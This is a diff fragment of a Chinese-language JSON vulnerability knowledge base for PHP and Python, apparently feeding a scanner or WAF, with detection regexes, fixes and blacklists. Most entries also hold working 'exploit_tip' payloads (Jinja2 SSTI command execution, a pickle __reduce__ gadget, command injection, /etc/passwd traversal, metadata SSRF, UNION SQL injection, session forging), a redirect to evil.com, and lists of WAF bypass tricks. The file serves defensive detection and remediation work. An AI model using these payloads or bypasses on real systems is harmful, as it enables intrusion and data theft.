+    "pattern": "(APP_DEBUG|display_errors|app\\.debug)\\s*[=:]\\s*(true|1|On|True)",
+    "severity": "medium",
+    "priority": 2,
+    "description": "生产环境开启调试"
+   },
+   {
+    "rule_id": "kbphp-info-3",
+    "name": "敏感文件路径",
+    "type": "regex",
+    "pattern": "(\\\\.env|\\\\.git/config|composer\\\\.lock|\\\\.svn/entries)",
+    "severity": "medium",
+    "priority": 3,
+    "description": "出现敏感配置文件引用"
+   }
+  ],
+  "fix_fast_method": "删除 phpinfo.php 与测试脚本；.env 移出 webroot；nginx 拦截点开头文件。",
+  "fix_secure_method": "生产环境 display_errors=Off、APP_DEBUG=false；用 .gitignore + 部署脚本排除 .git；\nnginx 增加 location ~ /\\.(?!well-known) { deny all; } 与备份文件后缀拦截。",
+  "fix_code_example": "location ~ /\\.(?!well-known) { deny all; }\nlocation ~* \\.(bak|sql|tar\\.gz|zip|swp|old)$ { deny all; }",
+  "fix_code_language": "nginx",
+  "fix_summary": "信息泄露本身不致命，但会直接交出数据库口令与源码。",
+  "exploit_tip": "curl http://t/.git/config\ncurl http://t/.env\ncurl http://t/index.php?s=/index/index/phpinfo",
+  "waf_template": "location ~ /\\. { deny all; }",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "phpinfo,.env,.git,composer.lock",
+  "framework_fix": "删除调试入口；nginx 拦截隐藏文件与备份后缀。",
+  "bypass_methods": [
+   "大小写 .ENV",
+   "URL 编码 %2eenv",
+   "路径穿越 /static/../.env"
+  ],
+  "false_positive": "误报：框架自带健康检查页可能输出版本号，属低危。",
+  "tags": "php,info-leak,debug,config",
+  "references": [
+   "https://owasp.org/www-project-top-ten/"
+  ]
+ },
+ {
+  "name": "PHP CRLF 响应头注入 / 邮件头注入",
+  "category": "crlf",
+  "language": "php",
+  "framework": "",
+  "severity": "medium",
+  "description": "header()、mail()、setcookie() 的参数若含 \\r\\n，可注入额外响应头（Set-Cookie、Location）或邮件头，导致会话固定、缓存投毒、开放重定向。",
+  "danger_functions": [
+   "header",
+   "setcookie",
+   "mail",
+   "mb_send_mail"
+  ],
+  "code_patterns": [
+   "header(",
+   "setcookie(",
+   "mail("
+  ],
+  "input_sources": [
+   "$_GET",
+   "$_POST",
+   "$_SERVER['HTTP_HOST']"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbphp-crlf-1",
+    "name": "header 拼接用户输入",
+    "type": "regex",
+    "pattern": "header\\s*\\(\\s*['\\\"][^'\\\"]*\\$_(GET|POST|REQUEST|SERVER)",
+    "severity": "high",
+    "priority": 1,
+    "description": "header 值含用户输入"
+   },
+   {
+    "rule_id": "kbphp-crlf-2",
+    "name": "mail 头注入",
+    "type": "regex",
+    "pattern": "mail\\s*\\([^)]*\\$_(GET|POST|REQUEST)",
+    "severity": "high",
+    "priority": 2,
+    "description": "mail 参数含用户输入，可注入 Bcc/Cc"
+   },
+   {
+    "rule_id": "kbphp-crlf-3",
+    "name": "Host 头拼接",
+    "type": "regex",
+    "pattern": "header\\s*\\(\\s*['\\\"]Location:[^'\\\"]*HTTP_HOST",
+    "severity": "medium",
+    "priority": 2,
+    "description": "Location 使用 Host 头，可被劫持"
+   }
+  ],
+  "fix_fast_method": "header('Location: '.str_replace([\"\\r\",\"\\n\"], '', $u));",
+  "fix_secure_method": "对进入响应头的值做 rawurlencode 或 preg_replace('/[\\r\\n]/','',$v)；\nLocation 只允许站内相对路径白名单，禁止使用 Host 头拼接。",
+  "fix_code_example": "$next = $_GET['next'] ?? '/';\n$next = preg_replace('/[\\r\\n]/', '', $next);\nif (!preg_match('#^/[\\w\\-/]*$#', $next)) { $next = '/'; }\nheader('Location: '.$next);",
+  "fix_code_language": "php",
+  "fix_summary": "响应头必须过滤 CR/LF，Location 只允许站内相对路径。",
+  "exploit_tip": "?next=%0d%0aSet-Cookie:PHPSESSID=attacker\n?next=//evil.com",
+  "waf_template": "if (preg_match('/[\\r\\n]/', $v)) { reject(); }",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "%0d%0a,Location,Set-Cookie",
+  "framework_fix": "过滤 CR/LF；Location 用相对路径白名单；禁止用 Host 头拼 URL。",
+  "bypass_methods": [
+   "%0d%0a 大小写混写",
+   "%E5%98%8A%E5%98%8D（UTF-8 过长的 CRLF）",
+   "\\r\\n 直接字节"
+  ],
+  "false_positive": "误报：header() 使用固定字符串不构成风险。",
+  "tags": "crlf,header-injection,php",
+  "references": [
+   "https://owasp.org/www-community/attacks/CRLF_Injection"
+  ]
+ },
+ {
+  "name": "Python Jinja2 SSTI（含过滤器链利用）",
+  "category": "ssti",
+  "language": "python",
+  "framework": "",
+  "severity": "critical",
+  "description": "render_template_string 或 Template() 渲染用户输入时，可用 {{7*7}} 探测、{{cycler.__init__.__globals__.os.popen('id').read()}} 或 attr 过滤器链直接 RCE。",
+  "danger_functions": [
+   "render_template_string",
+   "Template",
+   "jinja2",
+   "from_string"
+  ],
+  "code_patterns": [
+   "render_template_string(",
+   "Template(",
+   "Environment("
+  ],
+  "input_sources": [
+   "request.args",
+   "request.form",
+   "request.json"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbssti-jinja-1",
+    "name": "render_template_string 渲染输入",
+    "type": "regex",
+    "pattern": "render_template_string\\s*\\(\\s*(request\\.|f[\\\"']|.*\\+)",
+    "severity": "critical",
+    "priority": 1,
+    "description": "模板字符串来自请求或拼接"
+   },
+   {
+    "rule_id": "kbssti-jinja-2",
+    "name": "Template 直接渲染请求数据",
+    "type": "regex",
+    "pattern": "Template\\s*\\(\\s*(request\\.|user_|input|data)",
+    "severity": "high",
+    "priority": 2,
+    "description": "Template 构造函数接收外部数据"
+   },
+   {
+    "rule_id": "kbssti-jinja-3",
+    "name": "沙箱未启用",
+    "type": "regex",
+    "pattern": "(jinja2\\.)?Environment\\s*\\(",
+    "severity": "medium",
+    "priority": 3,
+    "description": "使用普通 Environment 而非沙箱环境"
+   }
+  ],
+  "fix_fast_method": "改用 render_template('固定模板名.html', **ctx)，永不把用户输入当模板。",
+  "fix_secure_method": "使用 jinja2.sandbox.SandboxedEnvironment；对模板变量只做值传递；\n如必须动态模板，用白名单语法解析（如受限的 str.format 或 Mustache）。",
+  "fix_code_example": "from jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\ntpl = env.from_string(open('templates/msg.html').read())  # 模板来自文件，不是用户\nreturn tpl.render(name=request.args.get('name'))",
+  "fix_code_language": "python",
+  "fix_summary": "用户输入只能是模板变量，不能是模板本身。",
+  "exploit_tip": "{{7*7}} → 49\n{{config}} 泄露 SECRET_KEY\n{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}\n{{lipsum.__globals__['os'].popen('id').read()}}",
+  "waf_template": "if (re.search(r'\\{\\{.*(config|__class__|__globals__|popen)', body)): block()",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "__class__,__globals__,popen,config,{{",
+  "framework_fix": "模板与数据分离；启用 SandboxedEnvironment；WAF 拦截 {{ }} 内危险属性。",
+  "bypass_methods": [
+   "{{ ''|attr('__class__') }}",
+   "{%print(7*7)%}",
+   "{{request|attr('application')}}",
+   "Unicode 全角括号"
+  ],
+  "false_positive": "误报：模板文件内正常使用 {{ var }} 不算风险。",
+  "tags": "ssti,jinja2,rce,python",
+  "references": [
+   "https://portswigger.net/web-security/server-side-template-injection"
+  ]
+ },
+ {
+  "name": "Python pickle / PyYAML 反序列化",
+  "category": "deserialization",
+  "language": "python",
+  "framework": "",
+  "severity": "critical",
+  "description": "pickle.loads、cPickle、yaml.load（无 Loader）在解析不可信数据时执行 __reduce__ 指定的函数；常见于 session cookie、缓存、队列消息、ML 模型文件。",
+  "danger_functions": [
+   "pickle.loads",
+   "pickle.load",
+   "yaml.load",
+   "dill",
+   "joblib"
+  ],
+  "code_patterns": [
+   "pickle.loads(",
+   "yaml.load(",
+   "cPickle.loads("
+  ],
+  "input_sources": [
+   "request.cookies",
+   "request.data",
+   "request.files",
+   "redis"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbpy-deser-1",
+    "name": "pickle 反序列化不可信数据",
+    "type": "regex",
+    "pattern": "(pickle|cPickle|_pickle|dill)\\.loads?\\s*\\(",
+    "severity": "critical",
+    "priority": 1,
+    "description": "出现 pickle 反序列化调用"
+   },
+   {
+    "rule_id": "kbpy-deser-2",
+    "name": "yaml.load 未指定 SafeLoader",
+    "type": "regex",
+    "pattern": "yaml\\.load\\s*\\(",
+    "severity": "high",
+    "priority": 2,
+    "description": "yaml.load 缺少 SafeLoader，可用 !!python/object 执行代码"
+   },
+   {
+    "rule_id": "kbpy-deser-3",
+    "name": "joblib/torch 加载外部文件",
+    "type": "regex",
+    "pattern": "(joblib\\.load|torch\\.load)\\s*\\(",
+    "severity": "medium",
+    "priority": 3,
+    "description": "模型文件加载同样基于 pickle"
+   }
+  ],
+  "fix_fast_method": "yaml.load(x) → yaml.safe_load(x)；pickle 改用 JSON。",
+  "fix_secure_method": "禁止对不可信数据使用 pickle；session 改用 itsdangerous 签名 JSON；\n必须用 pickle 时加 HMAC 校验并在受限子进程中加载。",
+  "fix_code_example": "import json, hmac, hashlib\nraw = request.cookies.get('state','')\nsig, _, payload = raw.partition('.')\nif not hmac.compare_digest(sig, hmac.new(KEY, payload.encode(), hashlib.sha256).hexdigest()):\n    abort(400)\ndata = json.loads(base64.b64decode(payload))",
+  "fix_code_language": "python",
+  "fix_summary": "pickle/yaml 反序列化等价于 RCE，必须换成 JSON + 签名。",
+  "exploit_tip": "class E:\n    def __reduce__(self):\n        return (os.system, ('id',))\npickle.dumps(E())\nyaml: !!python/object/apply:os.system ['id']",
+  "waf_template": "if (b'\\x80\\x04\\x95' in body or b'!!python/' in body): block()",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "pickle.loads,yaml.load,!!python/object",
+  "framework_fix": "禁用 pickle 处理外部数据；yaml 一律 safe_load；WAF 拦截 pickle 魔数 80 04 95。",
+  "bypass_methods": [
+   "base64 包裹 pickle",
+   "gzip/zlib 压缩后再 pickle",
+   "protocol=0 文本 pickle 规避魔数检测"
+  ],
+  "false_positive": "误报：内部可信队列使用 pickle 属常见，需看数据来源。",
+  "tags": "pickle,deserialization,rce,python",
+  "references": [
+   "https://docs.python.org/3/library/pickle.html#restricting-globals"
+  ]
+ },
+ {
+  "name": "Python 命令执行（shell=True / os.system）",
+  "category": "rce",
+  "language": "python",
+  "framework": "",
+  "severity": "critical",
+  "description": "os.system、subprocess 的 shell=True、os.popen 在参数拼接用户输入时可注入 ; | $() ` 等命令分隔符。",
+  "danger_functions": [
+   "os.system",
+   "os.popen",
+   "subprocess",
+   "commands"
+  ],
+  "code_patterns": [
+   "os.system(",
+   "shell=True",
+   "os.popen("
+  ],
+  "input_sources": [
+   "request.args",
+   "request.form",
+   "request.json"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbpy-rce-1",
+    "name": "os.system 拼接输入",
+    "type": "regex",
+    "pattern": "os\\.(system|popen)\\s*\\([^)]*(request\\.|input\\(|sys\\.argv)",
+    "severity": "critical",
+    "priority": 1,
+    "description": "os.system 参数含外部输入"
+   },
+   {
+    "rule_id": "kbpy-rce-2",
+    "name": "subprocess shell=True",
+    "type": "regex",
+    "pattern": "subprocess\\.\\w+\\s*\\([^)]*shell\\s*=\\s*True",
+    "severity": "high",
+    "priority": 2,
+    "description": "shell=True 会经过 shell 解析，需确认参数可信"
+   },
+   {
+    "rule_id": "kbpy-rce-3",
+    "name": "format 拼接命令",
+    "type": "regex",
+    "pattern": "(os\\.system|subprocess\\.\\w+)\\s*\\(\\s*f[\\\"'][^\\\"']*\\\\{",
+    "severity": "high",
+    "priority": 2,
+    "description": "f-string 直接拼接命令"
+   }
+  ],
+  "fix_fast_method": "改用列表参数 + shell=False：subprocess.run(['ls','-l',path], shell=False, check=True)",
+  "fix_secure_method": "shlex.quote 转义 + 参数白名单；更彻底的是用标准库替代外部命令（pathlib、shutil、ipaddress）。",
+  "fix_code_example": "import subprocess, shlex\npath = request.args['path']\nif not re.fullmatch(r'[\\w./-]{1,64}', path): abort(400)\nsubprocess.run(['ls','-l',path], shell=False, check=True, timeout=5)",
+  "fix_code_language": "python",
+  "fix_summary": "shell=True 等于把 shell 元字符交给攻击者，必须列表传参。",
+  "exploit_tip": "?host=127.0.0.1;id\n?host=$(id)\n?host=`id`",
+  "waf_template": "if (re.search(r'[;|&`$()\\n]', param)): block()",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "os.system,shell=True,subprocess",
+  "framework_fix": "列表传参 + shell=False；白名单正则；WAF 拦截 shell 元字符。",
+  "bypass_methods": [
+   "$IFS 代替空格",
+   "\\n 换行分隔",
+   "base64 解码后执行",
+   "python -c 二次执行"
+  ],
+  "false_positive": "误报：shell=True 且参数为常量时不构成风险。",
+  "tags": "rce,python,command-injection",
+  "references": [
+   "https://docs.python.org/3/library/subprocess.html#security-considerations"
+  ]
+ },
+ {
+  "name": "Python 路径穿越（open / send_file / os.path.join）",
+  "category": "lfi",
+  "language": "python",
+  "framework": "",
+  "severity": "high",
+  "description": "os.path.join(base, user) 在 user 为绝对路径或含 ../ 时会逃出 base；Flask send_from_directory、open()、zipfile.extract 同理，可读 /etc/passwd、源码、flag。",
+  "danger_functions": [
+   "open",
+   "send_file",
+   "send_from_directory",
+   "os.path.join",
+   "zipfile.extractall"
+  ],
+  "code_patterns": [
+   "open(",
+   "os.path.join(",
+   "send_file(",
+   "extractall("
+  ],
+  "input_sources": [
+   "request.args",
+   "request.form",
+   "request.view_args"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbpy-lfi-1",
+    "name": "os.path.join 拼接输入",
+    "type": "regex",
+    "pattern": "os\\.path\\.join\\s*\\([^)]*(request\\.|filename|name)",
+    "severity": "high",
+    "priority": 1,
+    "description": "路径拼接含用户输入"
+   },
+   {
+    "rule_id": "kbpy-lfi-2",
+    "name": "open 使用请求参数",
+    "type": "regex",
+    "pattern": "open\\s*\\(\\s*(request\\.|.*\\+.*request\\.)",
+    "severity": "high",
+    "priority": 1,
+    "description": "open 路径来自请求"
+   },
+   {
+    "rule_id": "kbpy-lfi-3",
+    "name": "extractall 未校验",
+    "type": "regex",
+    "pattern": "extractall\\s*\\(",
+    "severity": "medium",
+    "priority": 2,
+    "description": "zip 解压未校验条目路径，存在 zip slip"
+   }
+  ],
+  "fix_fast_method": "p = os.path.realpath(os.path.join(base, name)); if not p.startswith(base+os.sep): abort(403)",
+  "fix_secure_method": "使用 pathlib + resolve() + is_relative_to；文件名用 uuid 重命名；\n读文件改为按 ID 查数据库拿真实路径，彻底不接受路径参数。",
+  "fix_code_example": "from pathlib import Path\nbase = Path('/data/files').resolve()\np = (base / name).resolve()\nif not p.is_relative_to(base): abort(403)\nreturn p.read_bytes()",
+  "fix_code_language": "python",
+  "fix_summary": "路径参数必须 resolve 后校验前缀，或改为 ID 映射。",
+  "exploit_tip": "?file=../../../../etc/passwd\n?file=/etc/passwd\n?file=....//....//etc/passwd",
+  "waf_template": "if ('..' in param or param.startswith('/')): block()",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "../,/etc/passwd,%2e%2e",
+  "framework_fix": "resolve + 前缀校验；改用 ID 映射；WAF 拦截 ../ 与绝对路径。",
+  "bypass_methods": [
+   "%2e%2e%2f 编码",
+   "....// 双写",
+   "..%5c Windows 反斜杠",
+   "绝对路径直接覆盖 base"
+  ],
+  "false_positive": "误报：路径常量拼接不构成风险。",
+  "tags": "lfi,path-traversal,python",
+  "references": [
+   "https://cwe.mitre.org/data/definitions/22.html"
+  ]
+ },
+ {
+  "name": "Python SSRF（requests / urllib 无校验）",
+  "category": "ssrf",
+  "language": "python",
+  "framework": "",
+  "severity": "high",
+  "description": "requests.get(user_url) 未校验协议与目标，可打内网 169.254.169.254 元数据、Redis、FPM、K8s API，甚至 file:// 读本地文件；follow_redirects 会绕过一次性校验。",
+  "danger_functions": [
+   "requests.get",
+   "urllib.request.urlopen",
+   "httpx",
+   "aiohttp"
+  ],
+  "code_patterns": [
+   "requests.get(",
+   "urlopen(",
+   "allow_redirects=True"
+  ],
+  "input_sources": [
+   "request.args",
+   "request.json"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbpy-ssrf-1",
+    "name": "requests 使用用户 URL",
+    "type": "regex",
+    "pattern": "requests\\.(get|post|request)\\s*\\(\\s*(url|request\\.|.*request\\.(args|form|json))",
+    "severity": "high",
+    "priority": 1,
+    "description": "requests 目标 URL 来自请求"
+   },
+   {
+    "rule_id": "kbpy-ssrf-2",
+    "name": "urllib 打开用户输入",
+    "type": "regex",
+    "pattern": "urlopen\\s*\\(\\s*(request\\.|url)",
+    "severity": "high",
+    "priority": 2,
+    "description": "urlopen 目标来自用户输入"
+   },
+   {
+    "rule_id": "kbpy-ssrf-3",
+    "name": "重定向跟随",
+    "type": "regex",
+    "pattern": "allow_redirects\\s*=\\s*True",
+    "severity": "medium",
+    "priority": 3,
+    "description": "跟随重定向可绕过域名白名单"
+   }
+  ],
+  "fix_fast_method": "只允许 http/https + 域名白名单，并 allow_redirects=False。",
+  "fix_secure_method": "解析 DNS 后校验 IP 不在私网/回环/链路本地段；禁用 file/gopher/dict 协议；\n出网走统一代理并做响应大小与超时限制。",
+  "fix_code_example": "import ipaddress, socket, urllib.parse\nfrom urllib.parse import urlparse\nu = urlparse(url)\nif u.scheme not in ('http','https'): abort(400)\nif not u.hostname.endswith('.example.com'): abort(400)\nip = ipaddress.ip_address(socket.gethostbyname(u.hostname))\nif ip.is_private or ip.is_loopback or ip.is_link_local: abort(400)",
+  "fix_code_language": "python",
+  "fix_summary": "SSRF 必须协议 + 域名白名单 + DNS 解析后校验私网。",
+  "exploit_tip": "?url=http://169.254.169.254/latest/meta-data/\n?url=file:///etc/passwd\n?url=gopher://127.0.0.1:6379/_INFO",
+  "waf_template": "if (re.search(r'127\\.0\\.0\\.1|169\\.254|10\\.|192\\.168|file://|gopher://', url)): block()",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "169.254.169.254,gopher://,file://",
+  "framework_fix": "协议白名单 + 私网 IP 校验 + 关闭重定向；WAF 拦截元数据地址。",
+  "bypass_methods": [
+   "302 跳转到内网",
+   "DNS rebinding",
+   "十进制/八进制 IP 1.0.0.127",
+   "IPv6 [::1]",
+   "短链接"
+  ],
+  "false_positive": "误报：URL 完全由代码常量构造时无风险。",
+  "tags": "ssrf,python,metadata",
+  "references": [
+   "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
+  ]
+ },
+ {
+  "name": "Python SQL 注入（拼接 / text() / Raw）",
+  "category": "sqli",
+  "language": "python",
+  "framework": "",
+  "severity": "critical",
+  "description": "cursor.execute(f\"...{x}...\")、SQLAlchemy 的 text() 与 raw SQL 拼接、Django extra() 都会引入注入；ORM 过滤器传字符串也会被当作 SQL 片段。",
+  "danger_functions": [
+   "cursor.execute",
+   "text",
+   "raw",
+   "extra"
+  ],
+  "code_patterns": [
+   "execute(",
+   "text(",
+   ".raw(",
+   "extra("
+  ],
+  "input_sources": [
+   "request.args",
+   "request.form"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbpy-sqli-1",
+    "name": "execute 字符串拼接",
+    "type": "regex",
+    "pattern": "execute\\s*\\(\\s*(f[\\\"']|\\\"[^\\\"']*\\\"\\s*%|\\\"[^\\\"']*\\\"\\s*\\+|'[^']*'\\s*%|'[^']*'\\s*\\+)",
+    "severity": "critical",
+    "priority": 1,
+    "description": "execute 参数为拼接字符串"
+   },
+   {
+    "rule_id": "kbpy-sqli-2",
+    "name": "SQLAlchemy text 拼接",
+    "type": "regex",
+    "pattern": "text\\s*\\(\\s*(f[\\\"']|\\\"[^\\\"']*\\\"\\s*\\+)",
+    "severity": "critical",
+    "priority": 1,
+    "description": "text() 内拼接变量"
+   },
+   {
+    "rule_id": "kbpy-sqli-3",
+    "name": "Django extra 使用输入",
+    "type": "regex",
+    "pattern": "\\.extra\\s*\\([^)]*(request\\.|%s.*%|\\\\+)",
+    "severity": "high",
+    "priority": 2,
+    "description": "extra() 拼接 SQL 片段"
+   }
+  ],
+  "fix_fast_method": "cursor.execute(\"SELECT * FROM t WHERE id=%s\", (uid,))",
+  "fix_secure_method": "全部使用参数化查询；ORM 用 filter(id=uid)；禁止字符串拼接与 f-string 进 SQL。",
+  "fix_code_example": "cur.execute('SELECT * FROM users WHERE id = %s', (uid,))\nUser.query.filter_by(id=uid).first()\nsession.execute(text('SELECT * FROM users WHERE id=:id'), {'id': uid})",
+  "fix_code_language": "python",
+  "fix_summary": "SQL 必须参数化绑定，f-string 拼接等于注入。",
+  "exploit_tip": "?id=1 UNION SELECT username,password FROM users\n?id=1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)",
+  "waf_template": "if (re.search(r'(union\\s+select|sleep\\(|benchmark\\(|information_schema)', q, re.I)): block()",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "union select,sleep,information_schema",
+  "framework_fix": "参数化查询；WAF 拦截 UNION/SLEEP/注释符。",
+  "bypass_methods": [
+   "/**/ 注释替代空格",
+   "大小写 UnIoN",
+   "%55NION 编码",
+   "盲注用 time-based"
+  ],
+  "false_positive": "误报：execute 使用参数化占位符不构成风险。",
+  "tags": "sqli,python,orm",
+  "references": [
+   "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+  ]
+ },
+ {
+  "name": "Python 弱密钥 / 硬编码凭据",
+  "category": "weak-crypto",
+  "language": "python",
+  "framework": "",
+  "severity": "high",
+  "description": "SECRET_KEY 硬编码或为空可伪造 Flask session；MD5/SHA1 存密码、random 生成令牌、DEBUG=True 暴露 Werkzeug 控制台（可 RCE）。",
+  "danger_functions": [
+   "SECRET_KEY",
+   "hashlib.md5",
+   "random",
+   "DEBUG"
+  ],
+  "code_patterns": [
+   "SECRET_KEY",
+   "app.run(debug=True)",
+   "hashlib.md5("
+  ],
+  "input_sources": [
+   "config.py",
+   ".env",
+   "app.py"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbpy-key-1",
+    "name": "硬编码 SECRET_KEY",
+    "type": "regex",
+    "pattern": "SECRET_KEY\\s*=\\s*['\\\"][^'\\\"]{1,32}['\\\"]",
+    "severity": "high",
+    "priority": 1,
+    "description": "SECRET_KEY 硬编码且长度偏短"
+   },
+   {
+    "rule_id": "kbpy-key-2",
+    "name": "debug=True 上线",
+    "type": "regex",
+    "pattern": "(app\\.run\\s*\\([^)]*debug\\s*=\\s*True|DEBUG\\s*=\\s*True)",
+    "severity": "high",
+    "priority": 2,
+    "description": "开启调试模式，Werkzeug 控制台可 RCE"
+   },
+   {
+    "rule_id": "kbpy-key-3",
+    "name": "不安全哈希存密码",
+    "type": "regex",
+    "pattern": "hashlib\\.(md5|sha1)\\s*\\(",
+    "severity": "medium",
+    "priority": 2,
+    "description": "使用 MD5/SHA1 存储密码"
+   }
+  ],
+  "fix_fast_method": "SECRET_KEY=os.environ['SECRET_KEY']；debug=False。",
+  "fix_secure_method": "用 secrets.token_hex(32) 生成密钥并放环境变量；密码用 bcrypt/argon2；\n令牌用 secrets 模块而非 random。",
+  "fix_code_example": "import os, secrets\napp.secret_key = os.environ['SECRET_KEY']\nfrom werkzeug.security import generate_password_hash, check_password_hash\npw_hash = generate_password_hash(pw, method='argon2')",
+  "fix_code_language": "python",
+  "fix_summary": "密钥进环境变量、密码用 argon2、关调试。",
+  "exploit_tip": "flask-unsign --decode --cookie '<session>'\nflask-unsign --unsign --cookie '<session>' --wordlist rockyou.txt\n# 命中后可 --sign 伪造 admin session",
+  "waf_template": "if (re.search(r\"SECRET_KEY\\s*=\\s*['\\\"]\", code)): warn()",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "SECRET_KEY,debug=True,md5",
+  "framework_fix": "密钥外置并轮换；关闭 debug；密码哈希升级 argon2。",
+  "bypass_methods": [
+   "空 SECRET_KEY",
+   "密钥为 'secret'/'changeme'",
+   "同一密钥多环境复用"
+  ],
+  "false_positive": "误报：测试配置文件中出现密钥需结合部署环境判断。",
+  "tags": "weak-crypto,python,flask,secret",
+  "references": [
+   "https://flask.palletsprojects.com/en/latest/config/"
+  ]
+ }
+]
